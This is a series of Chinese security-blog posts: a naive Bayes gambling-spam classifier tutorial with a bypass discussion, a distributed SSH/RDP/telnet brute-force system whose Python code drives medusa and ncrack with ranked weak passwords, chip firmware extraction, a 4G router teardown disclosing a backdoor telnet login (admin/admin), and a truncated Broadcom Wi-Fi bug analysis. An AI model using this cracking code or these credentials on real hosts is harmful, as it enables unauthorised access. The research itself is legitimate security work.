根据您所选择的上述六合彩游戏，您必须在娱乐场完成总金额（存款+首存奖金）16倍或15倍流水之后，方可申请提款。 奖金将在您完成首存后即可存入您的账户。真人荷官 六合彩 欢迎来到全新番摊游戏！ 正常类别 Linux是一套免费使用和自由传播的类Unix操作系统，是一个基于POSIX和UNIX的多用户、多任务、支持多线程和多CPU的操作系统。 理查德·菲利普斯·费曼，美国理论物理学家，量子电动力学创始人之一，纳米技术之父。 我们可以注意到六合彩，游戏这两个词语，只在赌博类别的训练数据出现。这两个词语对句子是否是赌博类别会有很大的影响性，六合彩对赌博类别确实是重要的判别词，但是游戏这个词语本身和赌博没有直接的关系，却被错误划分为赌博类别相关的词语，当之后分类器遇到 我们提供最新最全大型游戏下载，迷你游戏下载，并提供大量游戏攻略 会因为里面的游戏，将它判断为赌博类别， &gt;&gt;&gt; result = cherry.classify(&apos;我们提供最新最全大型游戏下载，迷你游戏下载，并提供大量游戏攻略&apos;) &gt;&gt;&gt; result.percentage [(&apos;gamble.dat&apos;, 0.793), (&apos;normal.dat&apos;, 0.207)] &gt;&gt;&gt; result.word_list [(&apos;游戏&apos;, 1.9388011143762069)] 所以，当我们要做一个赌博/正常的分类器，我们需要在正常类别的训练数据添加： 中国游戏第一门户站,全年365天保持不间断更新,您可以在这里获得专业的游戏新闻资讯,完善的游戏攻略专区 这样的正常而且带有游戏关键字的句子。同时当训练数据过少，输入句子包含了训练数据中并没有c出现过的词语，该词语也会被分类器所忽略。cherry分类器)可以通过启用debug模式得到被错误划分的数据以及其权重最高的词语，你可以根据输出的词语来调整训练数据。我们之后可以通过Adaboost算法动态调整每个词语的权重，这个功能我们会在下一个版本推出。 另外一方面，现实生活中，正常的句子比赌博类别的句子出现的概率要多得多，这点我们也可以从训练数据的比例上面体现，适当增加正常类别句子的数量，也可以赋予正常类别句子高权重，不过要小心Accuracy_paradox的问题。我们在测试的时候，可以根据混淆矩阵以及ROC曲线来分析分类器的效果，再进行数据调整。 词袋集合为简单起见，本篇文章只选取4个句子作为训练数据： 赌博类别： 根据您所选择的上述礼遇，您必须在娱乐场完成总金额（存款+首存奖金）16倍或15倍流水之后，方可申请提款。 奖金将在您完成首存后即可存入您的账户。真人荷官 体育博彩 欢迎来到全新番摊游戏！ 正常类别： 理查德·菲利普斯·费曼，美国理论物理学家，量子电动力学创始人之一，纳米技术之父。 在公安机关持续不断的打击下，六合彩、私彩赌博活动由最初的公开、半公开状态转入地下。 要计算每个词语在不同类别下的概率，首先需要一个词袋集合，集合包含了训练数据中所有非重复词语(_vocab_list)，参考函数_get_vocab_list： def _get_vocab_list(self): &apos;&apos;&apos; Get a list contain all unique non stop words belongs to train_data Set up: self.vocab_list: [ &apos;What&apos;, &apos;lovely&apos;, &apos;day&apos;, &apos;like&apos;, &apos;gamble&apos;, &apos;love&apos;, &apos;dog&apos;, &apos;sunkist&apos; ] &apos;&apos;&apos; vocab_set = set() all_train_data = &apos;&apos;.join([v for _, v in self._train_data]) token = Token(text=all_train_data, lan=self.lan, split=self.split) vocab_set = vocab_set | set(token.tokenizer) self._vocab_list = list(vocab_set) 默认使用结巴分词进行中文分词（你可以定制分词函数），例如第一个数据： 根据您所选择的上述礼遇，您必须在娱乐场完成总金额（存款+首存奖金）16倍或15倍流水之后，方可申请提款。 分词后会得到： [&apos;根据&apos;, &apos;您&apos;, &apos;所&apos;, &apos;选择&apos;, &apos;的&apos;, &apos;上述&apos;, &apos;礼遇&apos;, &apos;，&apos;, &apos;您&apos;, &apos;必须&apos;, &apos;在&apos;, &apos;娱乐场&apos;, &apos;完成&apos;, &apos;总金额&apos;, &apos;（&apos;, &apos;存款&apos;, &apos;+&apos;, &apos;首存&apos;, &apos;奖金&apos;, &apos;）&apos;, &apos;16&apos;, &apos;倍&apos;, &apos;或&apos;, &apos;15&apos;, &apos;倍&apos;, &apos;流水&apos;, &apos;之后&apos;, &apos;，&apos;, &apos;方可&apos;, &apos;申请&apos;, &apos;提款&apos;, &apos;。&apos;] 我们去掉包含在stop_word.dat中的词语，stop_word.dat包含了汉语中的常见的转折词： 如果，但是，并且，不只… 这些词语对于我们分类器没有用处，因为任何类别都会出现这些词语。接下来再去掉长度等于1的字，第一个训练数据剩下： [&apos;选择&apos;, &apos;上述&apos;, &apos;礼遇&apos;, &apos;娱乐场&apos;, &apos;总金额&apos;, &apos;存款&apos;, &apos;首存&apos;, &apos;奖金&apos;, &apos;16&apos;, &apos;15&apos;, &apos;流水&apos;, &apos;申请&apos;, &apos;提款&apos;] 遍历4个句子最终得到长度为49的词袋集合(vocab_list)：（这里使用的集合是无序的，所以你得到的结果顺序可能不同） [&apos;提款&apos;, &apos;存入&apos;, &apos;游戏&apos;, &apos;最初&apos;, &apos;六合彩&apos;, &apos;娱乐场&apos;, &apos;费曼&apos;, &apos;奖金&apos;, &apos;账户&apos;, &apos;菲利普斯&apos;, &apos;量子&apos;, &apos;电动力学&apos;, &apos;总金额&apos;, &apos;上述&apos;, &apos;活动&apos;, &apos;状态&apos;, &apos;物理学家&apos;, &apos;公安机关&apos;, &apos;荷官&apos;, &apos;即可&apos;, &apos;理论&apos;, &apos;申请&apos;, &apos;半公开&apos;, &apos;选择&apos;, &apos;15&apos;, &apos;打击&apos;, &apos;全新&apos;, &apos;来到&apos;, &apos;公开&apos;, &apos;方可&apos;, &apos;博彩&apos;, &apos;完成&apos;, &apos;理查德&apos;, &apos;纳米技术&apos;, &apos;不断&apos;, &apos;存款&apos;, &apos;之一&apos;, &apos;创始人&apos;, &apos;真人&apos;, &apos;私彩&apos;, &apos;持续&apos;, &apos;根据&apos;, &apos;必须&apos;, &apos;16&apos;, &apos;赌博&apos;, &apos;欢迎&apos;, &apos;体育&apos;, &apos;转入地下&apos;, &apos;首存&apos;, &apos;流水&apos;, &apos;美国&apos;, &apos;礼遇&apos;] 得到词袋之后，再次使用训练数据，并把每个训练数据都转变成一个长度为49的一维向量 def _get_vocab_matrix(self): &apos;&apos;&apos; Convert strings to vector depends on vocal_list &apos;&apos;&apos; array_list = [] for k, data in self._train_data: return_vec = np.zeros(len(self._vocab_list)) token = Token(text=data, lan=self.lan, split=self.split) for i in token.tokenizer: if i in self._vocab_list: return_vec[self._vocab_list.index(i)] += 1 array_list.append(return_vec) self._matrix_lst = array_list 根据您所选择的上述礼遇，您必须在娱乐场完成总金额（存款+首存奖金）16倍或15倍流水之后，方可申请提款。 对应转变成： # 长度为49的一维向量 [1, 0, 0, 0, 1, 0, ..., 1, 0, 1] 其中的1分别对应着数据分词后的词语在词袋中出现的次数。接下来将所有训练数据的一维向量组合成列表_matrix_list [ [1, 0, 0, 0, 1, 0, ..., 1, 0, 1] [0, 1, 1, 0, 0, 0, ..., 0, 0, 0] ... ] 要计算每个词语在不同类别下的概率，只需要把词语出现的次数除以该类别的所有词语的总数， cherry分类器出于效率的考虑使用了numpy的矩阵运算。 def _training(self): &apos;&apos;&apos; Native bayes training &apos;&apos;&apos; self._ps_vector = [] # 防止有词语在其他类别训练数据中没有出现过，最后的P(句子|类别)乘积就会为零，所以给每个词语一个初始的非常小的出现概率，设置vector默认值为1，cal对应为2 # vector: 默认值为1的一维数组 # cal: 默认的分母，计算该类别所有有效词语的总数 # num: 计算P(赌博), P(句子) vector_list = [{ &apos;vector&apos;: np.ones(len(self._matrix_lst[0])), &apos;cal&apos;: 2.0, &apos;num&apos;: 0.0} for i in range(len(self.CLASSIFY))] for k, v in enumerate(self.train_data): vector_list[v[0]][&apos;num&apos;] += 1 # vector加上对应句子的词向量，最后把整个向量除于cal，就得到每个词语在该类别的概率。 # [1, 0, 0, 0, 1, 0, ..., 1, 0, 1] (根据您所选择的...) # [0, 1, 1, 0, 0, 0, ..., 0, 0, 0] (奖金将在您完成...) # + # [1, 1, 1, 1, 1, 1, ..., 1, 1, 1] vector_list[v[0]][&apos;vector&apos;] += self._matrix_lst[k] vector_list[v[0]][&apos;cal&apos;] += sum(self._matrix_lst[k]) for i in range(len(self.CLASSIFY)): # 每个词语的概率为[2, 2, 2, 1, 2, 1, ..., 2, 1, 2]/cal self._ps_vector.append(( np.log(vector_list[i][&apos;vector&apos;]/vector_list[i][&apos;cal&apos;]), np.log(vector_list[i][&apos;num&apos;]/len(self.train_data)))) 遍历完所有训练数据之后，会得到两个类别对应的每个词语的概率向量，(为了防止python的小数相乘溢出，这里的概率都是取np.log()对数之后得到的值)： #赌博 ([-2.80336038, -2.80336038, -2.80336038, -3.49650756, -3.49650756, -2.80336038, -3.49650756, -2.39789527, -2.80336038, -3.49650756, -3.49650756, -3.49650756, -2.80336038, -2.80336038, -3.49650756, -3.49650756, -3.49650756, -3.49650756, -2.80336038, -2.80336038, -3.49650756, -2.80336038, -3.49650756, -2.80336038, -2.80336038, -3.49650756, -2.80336038, -2.80336038, -3.49650756, -2.80336038, -2.80336038, -2.39789527, -3.49650756, -3.49650756, -3.49650756, -2.80336038, -3.49650756, -3.49650756, -2.80336038, -3.49650756, -3.49650756, -2.80336038, -2.80336038, -2.80336038, -3.49650756, -2.80336038, -2.80336038, -3.49650756, -2.39789527, -2.80336038, -3.49650756, -2.80336038]), 0.5) # 正常 ([-3.25809654, -3.25809654, -3.25809654, -2.56494936, -2.56494936, -3.25809654, -2.56494936, -3.25809654, -3.25809654, -2.56494936, -2.56494936, -2.56494936, -3.25809654, -3.25809654, -2.56494936, -2.56494936, -2.56494936, -2.56494936, -3.25809654, -3.25809654, -2.56494936, -3.25809654, -2.56494936, -3.25809654, -3.25809654, -2.56494936, -3.25809654, -3.25809654, -2.56494936, -3.25809654, -3.25809654, -3.25809654, -2.56494936, -2.56494936, -2.56494936, -3.25809654, -2.56494936, -2.56494936, -3.25809654, -2.56494936, -2.56494936, -3.25809654, -3.25809654, -3.25809654, -2.56494936, -3.25809654, -3.25809654, -2.56494936, -3.25809654, -3.25809654, -2.56494936, -3.25809654]), 0.5) # 词袋集合 [&apos;提款&apos;, &apos;存入&apos;, &apos;游戏&apos;, &apos;最初&apos;, &apos;六合彩&apos;, &apos;娱乐场&apos;, &apos;费曼&apos;, &apos;奖金&apos;, &apos;账户&apos;, &apos;菲利普斯&apos;, &apos;量子&apos;, &apos;电动力学&apos;, &apos;总金额&apos;, &apos;上述&apos;, &apos;活动&apos;, &apos;状态&apos;, &apos;物理学家&apos;, &apos;公安机关&apos;, &apos;荷官&apos;, &apos;即可&apos;, &apos;理论&apos;, &apos;申请&apos;, &apos;半公开&apos;, &apos;选择&apos;, &apos;15&apos;, &apos;打击&apos;, &apos;全新&apos;, &apos;来到&apos;, &apos;公开&apos;, &apos;方可&apos;, &apos;博彩&apos;, &apos;完成&apos;, &apos;理查德&apos;, &apos;纳米技术&apos;, &apos;不断&apos;, &apos;存款&apos;, &apos;之一&apos;, &apos;创始人&apos;, &apos;真人&apos;, &apos;私彩&apos;, &apos;持续&apos;, &apos;根据&apos;, &apos;必须&apos;, &apos;16&apos;, &apos;赌博&apos;, &apos;欢迎&apos;, &apos;体育&apos;, &apos;转入地下&apos;, &apos;首存&apos;, &apos;流水&apos;, &apos;美国&apos;, &apos;礼遇&apos;] 结合向量和词袋集合来看，提款，存入，游戏这几个词是赌博的概率要大于正常的概率 #赌博 提款，存入，游戏 [-2.80336038, -2.80336038, -2.80336038] #正常 提款，存入，游戏 [-3.25809654, -3.25809654, -3.25809654] 符合我们的常识，接下来就可以进行输入句子的分类了。 判断类别训练完数据，得到词语对应概率之后，判断类别就非常简单，只需要把输入句子进行相同的分词，然后计算对应的词语对应的概率的乘积即可，得到乘积最大的就是最有可能的类别。输入句子：​ 欢迎参加澳门在线娱乐城，这里有体育，百家乐，六合彩各类精彩游戏。 先根据原先的词袋集合，先转变为一维向量 # 词袋集合 [&apos;提款&apos;, &apos;存入&apos;, &apos;游戏&apos;, &apos;最初&apos;, &apos;六合彩&apos;, &apos;娱乐场&apos;, &apos;费曼&apos;, &apos;奖金&apos;, &apos;账户&apos;, &apos;菲利普斯&apos;, &apos;量子&apos;, &apos;电动力学&apos;, &apos;总金额&apos;, &apos;上述&apos;, &apos;活动&apos;, &apos;状态&apos;, &apos;物理学家&apos;, &apos;公安机关&apos;, &apos;荷官&apos;, &apos;即可&apos;, &apos;理论&apos;, &apos;申请&apos;, &apos;半公开&apos;, &apos;选择&apos;, &apos;15&apos;, &apos;打击&apos;, &apos;全新&apos;, &apos;来到&apos;, &apos;公开&apos;, &apos;方可&apos;, &apos;博彩&apos;, &apos;完成&apos;, &apos;理查德&apos;, &apos;纳米技术&apos;, &apos;不断&apos;, &apos;存款&apos;, &apos;之一&apos;, &apos;创始人&apos;, &apos;真人&apos;, &apos;私彩&apos;, &apos;持续&apos;, &apos;根据&apos;, &apos;必须&apos;, &apos;16&apos;, &apos;赌博&apos;, &apos;欢迎&apos;, &apos;体育&apos;, &apos;转入地下&apos;, &apos;首存&apos;, &apos;流水&apos;, &apos;美国&apos;, &apos;礼遇&apos;] # 长度为49的一维向量 [0, 0, 1, 0, 1, ...] 然后与分别与两个概率向量相乘，求和，并加上对应的类别占比，对应的代码： def _bayes_classify(self): &apos;&apos;&apos; Calculate the probability of different category &apos;&apos;&apos; possibility_vector = [] log_list = [] # self._ps_vector: ([-3.44, -3.56, -2.90], 0.4) for i in self._ps_vector: # 计算每个词语对应概率的乘积 final_vector = i[0] * self.word_vec # 获取对分类器影响度最大的词语 word_index = np.nonzero(final_vector) non_zero_word = np.array(self._vocab_list)[word_index] # non_zero_vector: [-7.3, -8] non_zero_vector = final_vector[word_index] possibility_vector.append(non_zero_vector) log_list.append(sum(final_vector) + i[1]) possibility_array = np.array(possibility_vector) max_val = max(log_list) for i, j in enumerate(log_list): # 输出最大概率的类别 if j == max_val: max_array = possibility_array[i, :] left_array = np.delete(possibility_array, i, 0) sub_array = np.zeros(max_array.shape) # 通过曼哈顿举例，计算影响度最大的词语 for k in left_array: sub_array += max_array - k return self._update_category(log_list), \\ sorted( list(zip(non_zero_word, sub_array)), key=lambda x: x[1], reverse=True) 通过计算： P(赌博|句子) = sum([0, 0, 1, 0, 1, …] * [-2.80336038, -2.80336038, -2.80336038, …]) + P(赌博) = 0.85 P(正常|句子) = sum([0, 0, 1, 0, 1, …] * [-3.25809654, -3.25809654, -3.25809654, …])+ P(正常) = 0.15 最终得到P(赌博|句子) &gt; P(正常|句子)，所以分类器判断这个句子是赌博类别。 &gt;&gt;&gt; result = cherry.classify(&apos;欢迎参加澳门在线娱乐城，这里有体育，百家乐，六合彩各类精彩游戏。&apos;) &gt;&gt;&gt; result.percentage [(&apos;gamble.dat&apos;, 0.85), (&apos;normal.dat&apos;, 0.15)] &gt;&gt;&gt; result.word_list [(&apos;六合彩&apos;, 0.96940055718810347), (&apos;游戏&apos;, 0.96940055718810347), (&apos;欢迎&apos;, 0.56393544907993931)] 测试统计分析测试方法有留出法(hold-out)，k折交叉验证法(cross validation)，自助法(bootstrapping)，这里我们使用留出法，测试脚本默认每次从所有数据中选出60个句子当成测试数据，剩下的当成训练数据。重复进行测试10次。运行测试脚本 &gt;&gt;&gt; python runanalysis.py This may takes some time, Go get a coffee :D. Building prefix dict from the default dictionary ... Loading model from cache /var/folders/md/0251yy51045d6nknpkbn6dc80000gn/T/jieba.cache Loading model cost 0.914 seconds. Prefix dict has been built succesfully. +Cherry---------------+------------+------------+ | Confusion matrix | gamble.dat | normal.dat | +---------------------+------------+------------+ | (Real)gamble.dat | 249 | 0 | | (Real)normal.dat | 13 | 338 | | Error rate is 2.17% | | | +---------------------+------------+------------+ 输出分类测试数据的平均错误率为2.17%，同时我们可以通过混淆矩阵对分类器进行分析： 查全率(recall)（能找出赌博类别句子的概率） 真阳性/(真阳性+假阴性) 249 / 249 = 100% 查准率(precision)（分类为赌博类别中的句子，确实是赌博类别的概率） 真阳性/(真阳性+假阳性) 249 / (249 + 13) = 95% 如果业务的需求是尽可能找到潜在的阳性数据（例如癌症初检）那么就要求高查全率，不过对应的，高查全率会导致查准率降低。（可以这样理解，假如所有句子都判断成赌博类别，那么所有确实是赌博类别的句子确实都被检测到了，但是查准率变得很低。）影响查全率以及查准率的一点是训练数据数量的比例，日常的句子中，赌博类别的句子与正常类别的句子比例可能是1:50。也就是说随便给出一个句子，不用看内容，那么它有98%是正常的。不过在某些情况下，例如热门评论区打广告的用户就很多，那么这个比例就变成1:10或者1:20，这个比例是根据具体业务而调整的。训练数据也应该遵循这个比例，但是实现中，我们必须要找到大量独立分布的数据才能遵循这个比例，这就是机器学习数据常遇到的不均衡分类问题。要解决这个问题，可以引入Adaboost算法动态调整每个词语的权重。。我们可以通过-p参数输出ROC曲线： ROC曲线横坐标代表的是假阳性（没有问题却被判断为有问题），纵坐标代表的是真阳性（有问题而且被判断出来），一个优秀的分类器尽可能维持高真阳性以及低假阳性。一般来说，如果一个分类器的ROC曲线包含了另外一个分类器的ROC曲线，代表此分类器在此数据集的分类效果更好。 算法分析 上下文关联 分类器绕过 上下文关联当我们计算P(输入句子|类别)的时候，我们把输入句子分成了词语的集合，同时假定了输入句子中词语与词语之间没有上下文关系，其实这是不完全正确的，例如： 警方召开了全省集中打击赌博违法犯罪活动... 从常识句子的上下文判断，集中打击出现在赌博违法犯罪之前的概率，要比召开出现在赌博违法犯罪之前的概率高，不过当我们把输入句子分成词语的集合的时候，把它们看成每个词语都是独立分布的。这也是此算法称为朴素贝叶斯的原因，如果我们有大量的数据集，计算出每个词语对应词袋模型其他词语的出现概率值的话，可以提高检测的准确率。 要注意的是，训练数据选择与最后进行分类的数据必须尽量关联，如果要检测的句子与训练数据有非常大的差别，例如检测的内容包含大量的英文单词，但是训练数据却没有，那么分类器就无法进行正确的分类。同时，输入句子过短的话，分类器也无法很好地进行分类。因为分类的结果会很容易被其中的一两个词语所影响。 分类器绕过分类器无法分辨重复内容或部分无意义文本，输入句子： 车厘子车厘子车厘子车厘子 加入博彩121加qq看头像，很为温暖文科楼课文你问你看我呢额可能我呃让你听客啊啊爱看就是是过分过分你问人人官方代购极为。 前两个是垃圾内容，但是即使我们添加垃圾内容的数据集，也很难判断正确。最后一个前一小段是赌博类别的句子，后面一长串是无意义或者正常类别的句子，分类器综合判断它是正确的句子。解决这个问题我们可以用一个简单的方法，计算句子的熵，也就是无序程度。每个句子都有合理的长度以及合理的无序程度，什么意思呢？句子的长度大约遵循正态分布，极长（不包含标点符号）或者极短的句子出现的概率比较低，同时，通常一个句子中的词语不会重复出现很多次，它的无序程度是在某个范围的。当我们看到前两个句子，因为它们词语的重复度非常高，所以句子的无序度非常低，如何计算句子的无序程度呢？ 我们找两个输入句子作为例子，先把输入句子进行分词 车厘子是一只非常可爱的猫咪 车厘子车厘子车厘子车厘子 [车厘子，非常，可爱，猫咪] [车厘子，车厘子，车厘子，车厘子] 计算每个词语出现的次数除于句子的词语数量： P(车厘子) = P(非常) = P(可爱) = P(猫咪) = 1/4 (句子1) P(车厘子) = 4/4 = 1 (句子2) 通过计算熵的公式，带入每个概率值，最后除于句子的词语数量 H = -sum(p(x)log2p(x)) H1 = ((1/4 * -2) - (1/4 * -2) - (1/4 * -2) - (1/4 * -2)) / 4= -2 / 4 = -1/2 H2 = 0 可以看到，在同样的句子长度下，第一个句子的熵为-2，第二个为0，可以设置一个熵的范围，如果低于该值，代表句子可能是垃圾数据。一般来说，先进行垃圾文本过滤，然后进行贝叶斯模型的分类，在工程中会有更好的效果。 总结理解了贝叶斯分类的原理，你就能根据自己的业务需求，来判断使用什么分词函数，使用哪些stop_word，可以定制适合业务的数据集，同时根据输出的被错误分类的数据以及混淆矩阵，做出对应的调整。如果有什么疑问，欢迎留言。","tags":[{"name":"贝叶斯分类","slug":"贝叶斯分类","permalink":"http://www.future-sec.com/tags/贝叶斯分类/"}],"categories":[{"name":"web安全","slug":"web安全","permalink":"http://www.future-sec.com/categories/web安全/"}]},{"title":"谁是僵尸之王-如何进行高效的分布式爆破","date":"2018-04-07T16:00:00.000Z","path":"king-of-zombie.html","text":"前言在研发漏洞扫描器的弱口令破解模块时，发现传统的通过字典遍历用户名密码的算法效率过低，当需要大批量高速爆破时，难以满足此类需求，因此需要引入新的算法，本文以一个分布式扫描器的爆破模块为例，演示如何进行高效快速的分布式爆破。 传统方法传统的密码穷举 效率非常低，而且还有可能触发报警 king of zombiekoz (king of zombie) 算法,即首先按照多种算法对用户名密码字典组合进行评分,然后用评分最高的组合去淘汰僵尸主机。 流程 上游push ncrack任务到队列 koz 节点开始瓜分队列任务,保存为任务列表 (根据cpu,网速来分配多少任务) 。 使用账号密码字典爆破来遍历任务列表,hit中 即从列表中淘汰(字典按评分优先级排序)。 说明 字典评分按照爆破成功记录次数和蜜罐记录次数来计算,master 端实时更新,koz node 每日定时更新。 淘汰机制具体为先去除一大部分普遍存在的弱口令,例如某一批次中,第一次使用 ubnt/ubnt 来爆破ssh服务,就能淘汰 15% 的任务,第二次使用 root/123456 能淘汰 3% 。 表结构pw_koz_level 列 类型 注释 id int(11) 自动增量 username varchar(255) 用户名 password varchar(255) 密码 type varchar(255) 类型 score int(11) 评分 更新算法目前数据来源有四个第一个 扫描器爆破成功记录 score 值为 10第二个 蜜罐记录 score 值 为 1第三个 渗透进去提取到的有效密码(例如windows 明文) ,score 10第四个 收集的各种工具扫描字典 score 值为 1 扫描的时候工具score 值来排序,命中一次之后+10 例如如下字典列表 master推送任务之后使用无状态扫描工具扫描服务和指纹识别 koz nodeKozTask 类来保存本地任务队列,接收处的代码为 123456def pop_member(self): while self.len() &gt; 0: str_member=self.pop() koz_member=ast.literal_eval(str_member) self.list_member[str(koz_member['name'])].append(koz_member) util.log(\"pop koz_member done count:%d\" % (self.count()),2,'koztask') 本地队列处理完毕之后,开始foreach 循环用户名密码组合(根据score 大小优先级) 123456789101112131415koz_levels=get_koz_level()for koz_level in koz_levels : koz_queue.queue.clear() #member=&#123;'name': 'ssh', 'task_id': 1124, 'url': '', 'host': '168.167.45.250', 'version': '', 'type': 'service', 'port': 22&#125; #ncrack.scan(member,koz_level) #break try : for member in koz_task.list_member[koz_level['type']] : koz_queue.put(&#123;'member':member,'level':koz_level&#125;) work_manager = WorkManager(koz_queue, config.koz_thread) # thread work_manager.wait_allcomplete() except Exception, e: util.log(\"error info:\"+str(e),3,'koz_node') util.log('koz_member len:%d' % (koz_task.count()),1,'koz_node') 当扫描出来结果时,直接把它从 koz_member 队列里面remove 掉,如此循环往复,直到跑完所有的密码。remove 12345678def run(self): while 1: if self.work_queue.empty() == True: break task = self.work_queue.get(block=False) if ncrack.scan(task['member'],task['level']) != False : koz_type=task['member']['name'] koz_task.list_member[koz_type].remove(task['member']) 爆破算法负责爆破的为ncrack 模块,调用的爆破工具有 medusa,ncrack。部分实现 123456789101112131415161718def scan(target,level): if target['name'] == 'ms-wbt-server' or target['name'] == 'telnet' : str_command = \"ncrack --user %s --pass %s %s:%d \" % (level['username'],level['password'],target['host'],target['port']) str_ret=str(sys_exec(['ncrack', '--user',level['username'], '--pass', level['password'], target['host']+':'+ str(target['port'])])) else : str_command = \"medusa -u %s -p %s -h %s -n %d -M %s\" % (level['username'], level['password'], target['host'], target['port'], target['name']) str_ret=str(sys_exec(['medusa','-u',level['username'],'-p',level['password'],'-h',target['host'],'-n',str(target['port']),'-M',target['name']])) util.log(str_command, 2, 'ncrack') #need change if 'ACCOUNT FOUND' in str_ret or 'credentials' in str_ret: str_data='[%s] %s %s:%s' % (target['name'],target['host'],level['username'],level['password']) util.log('ncrack taskid:%d target:%s service:%s succeed' % (target['task_id'], target['host'], target['name']), 1, 'ncrack') return report(target,str_data) else : return False 爆破结果 总览 图文分析 部分结果一览","tags":[{"name":"密码爆破","slug":"密码爆破","permalink":"http://www.future-sec.com/tags/密码爆破/"}],"categories":[{"name":"web安全","slug":"web安全","permalink":"http://www.future-sec.com/categories/web安全/"}]},{"title":"芯片安全系列-Let's cook!","date":"2018-01-20T16:00:00.000Z","path":"chip-security-let-us-cook.html","text":"前言芯片安全是针对芯片本身的安全研究，其在知识产权保护，防抄板山寨、加密破解、优化设计、漏洞挖掘和芯片木马等方面都具有深远意义，传统安全往往着眼于上层应用和驱动层面的安全，然而如果芯片存在本质的设计缺陷或安全漏洞，传统安全手段往往很难触及底层，前段时间英特尔芯片的“崩溃”（Meltdown）和“幽灵”（Spectre）漏洞，轰动整个世界，造成了巨额的损失，此次漏洞爆发就是因为芯片自身的设计缺陷所导致的，芯片级的安全研究是一项长期而艰难的工作，其是一门涉及多学科多门类的综合性研究，包括：微电子学、计算机科学、数学、物理学、化学、电磁学、光学等等。芯片分析方式主要包括非侵入式、半侵入式、侵入式、侧信道等。本文通过对某款蓝牙锁芯片的处理和固件提取，作为芯片分析的简单实例。 拆焊在PCB背面有一颗CC2541的蓝牙芯片，此款芯片采用QFN-40封装格式，没有暴露的可以直连外部引脚，厂商在量产时也把调试接口去掉了，为了获取芯片的固件内容，需要进行拆焊。 拆焊所需工具包括：热风枪、焊枪、松香水、吸锡线、洗板水或无水酒精、无纺布、镊子等。热风枪温度调到360度，风速在5档左右，先在距离PCb上方3到5厘米处，给PCB预热几秒，然后缓缓下移到1厘米处，沿着芯片的四周匀速转动，枪口务必不要对准芯片的中心处，防止芯片过热，造成损毁，大概20秒左右即可融化芯片底部焊锡，另一只手用镊子夹住芯片，轻轻往上一提，芯片即可从PCB取下。 清洁取下芯片之后，芯片的底部会粘有很多未去除的焊锡和脏物，需要进一步清洁处理，首先滴上松香水，用焊枪使焊锡融化。 然后用吸锡线配合焊枪把多余的焊锡和脏物吸掉，反复几次。 处理完毕之后，用洗板水和无纺布擦洗芯片，彻底去除脏物残留，引脚应保持光亮，以防接触不良和短路。 焊锡、松香水和洗板水气味比较刺鼻，高温易伤手，工作环境需要注意通风，有条件可以配置防护服。 芯片读取CC2541芯片是TI出品的一款蓝牙芯片，TI有专门的工具和软件来读取，包括：CCDebugger调试器和SmartRF Flash Programmer软件，因芯片已经拆下，可以通过转接板或烧录座连接芯片，引出相应的接口，然后连接CCDebugger进行固件的读取。 把处理好的芯片放入烧录座，需要正确放置芯片，可以通过芯片正面的小圆点确定方向。 确认无误之后，压紧烧录座盖，连上CCDebugger。 打开SmartRF Flash Programmer，选择Read flash into hex-file选项，在Flash image选项可以选择保存的路径和文件名，然后点Perform actions，即可开始读取。 读取的文件格式为HEX，然后根据对应的CPU指令编写进行反汇编。 部分芯片另需进行开片和晶体电路修改等等深度处理，本文是伏宸实验室关于芯片安全的一篇先导性文章，后续将会有一系列关于芯片安全的文章，敬请期待。","tags":[{"name":"芯片安全","slug":"芯片安全","permalink":"http://www.future-sec.com/tags/芯片安全/"}],"categories":[{"name":"芯片安全","slug":"芯片安全","permalink":"http://www.future-sec.com/categories/芯片安全/"}]},{"title":"某4G无线路由终端分析","date":"2018-01-19T16:00:00.000Z","path":"analysis-of-a-4G-wireless-router.html","text":"设备介绍随着4G网络的大区域覆盖，移动端的网络速度得到大幅提升，此次分析的该款4G无线路由终端，就是通过sim卡连上LTE网络之后，在通过wifi模块将蜂窝网络转为wifi信号共享给其他设备使用，其原理与手机共享热点类似，因其便携省电等功能，目前在市场上的反响颇高，X宝销量达数万件。 硬件分析话不多说，进入正题，拆掉背面螺丝，取出电池，揭掉正面盖板，在正面PCB上是一块全彩TFT屏幕，显示效果一般，屏幕下方有多个印字。 左侧有两个焊点，分别是RXD和TXD口，可以通过UART模式调试。 下方左侧是8口的JTAG调试口，加一个公用GND口，JTAG调试下篇会重点介绍。 正下方靠近USB充电口位置是电源电压测试口，主要用来测量额定输入输出的电源电压。 拆掉PCB上的螺丝，翻转板子，背面包括SIM插槽、SD卡插槽以及核心处理芯片，出于保护和散热的目的，还加装了保护盖。 拆掉盖子，先看下主要芯片的型号和用途，这对进一步分析有很大帮助。 图上标注1的芯片通过查看印字分析,为芯天下出产的PN26Q01AWSIUG 型存储芯片，存储容量为1G。 标注2的芯片为中兴微电子生产的ZX297520型手机modem芯片，支持TD-LTE/FDD LTE /WCDMA/TD-SCDMA/EDGE全模制式。 标注3的芯片为Realtek生产的使用非常广泛的RTL8189ES无线wifi芯片，是一款高性能、低功耗、体积小SDIO接口无线模组。 标注4的芯片为中兴微电子生产的ZX23422电源管理芯片。 标注5的芯片为锐迪科（RDA）生产的RPM6743射频前端芯片，是蜂窝网络和wifi信号广播收发的重要组成部分。 串口调试在认识设备的基本构成之后，重新组装好，首先通过正面的UART调试串口来进行初步调试，采用夹具连接RXD、TXD两个调试点，在设备通电情况下，只需把转接板上的GND口与板子上的公用GND口相连即可。 因串口输出信息过多，影响观察输入和输出结果，因此采用串口调试助手，设置波特率为115200，输入命令并发送，可以成功执行。 初步分析查看当前进程，通过串口输出信息，发现该终端采用goahead作为web服务器，4719端口存在一个telnet服务。 连接wifi进入web管理界面，查看设备ip。 通过telnet连接设备，使用弱口令弱口令：admin、admin即可登录。 该账号为后门账号。 查看开启的端口。 如果需要继续分析，可以通过tftp 传输文件至本地，例如/bin/goahead。","tags":[{"name":"硬件安全","slug":"硬件安全","permalink":"http://www.future-sec.com/tags/硬件安全/"}],"categories":[{"name":"硬件安全","slug":"硬件安全","permalink":"http://www.future-sec.com/categories/硬件安全/"}]},{"title":"BROADCOM WI-FI芯片漏洞分析三","date":"2018-01-18T16:00:00.000Z","path":"broadcom-wifi-3.html","text":"切入点从解析wme信标帧开始参考：freebuf博客：完整解析博通WiFi芯片Broadpwn漏洞先找到固件中的漏洞位置，如下代码所示，有几个关键的数据帧标志类型。根据管理帧的类型在 VMG-1312 的源代码定位到处理这部分管理帧数据包的代码。 123456789101112131415161718192021222324252627frame_type = *(unsigned __int16 *)(arg + 8); // arg-&gt;frame_type cfg = *(_DWORD *)(arg + 4); // arg-&gt;bsscfg v4 = wlc; ie = *(_DWORD *)(arg + 0xC); // arg-&gt;ie current_wmm_ie = 